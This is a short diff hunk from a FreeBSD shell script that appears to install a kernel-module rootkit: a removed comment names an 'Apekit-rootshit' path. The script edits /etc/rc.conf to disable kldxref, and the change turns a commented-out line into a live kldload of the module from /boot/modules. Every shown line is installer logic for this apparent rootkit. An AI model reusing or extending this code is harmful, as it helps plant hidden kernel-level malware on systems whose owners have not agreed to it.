@@ -53,7 +53,7 @@ mv "$TEMP_FILE" "$CONFIG_FILE"
 # Disable kldxref by setting kldxref_enable="NO"
 sed -i '' 's/^kldxref_enable="YES"/kldxref_enable="NO"/' /etc/rc.conf
 
-# kldload "/Apekit-rootshit/$LKM_NAME"
+kldload "/boot/modules/$LKM_NAME"
 
 # mkdir /boot/kernel/.ko_backup/
 
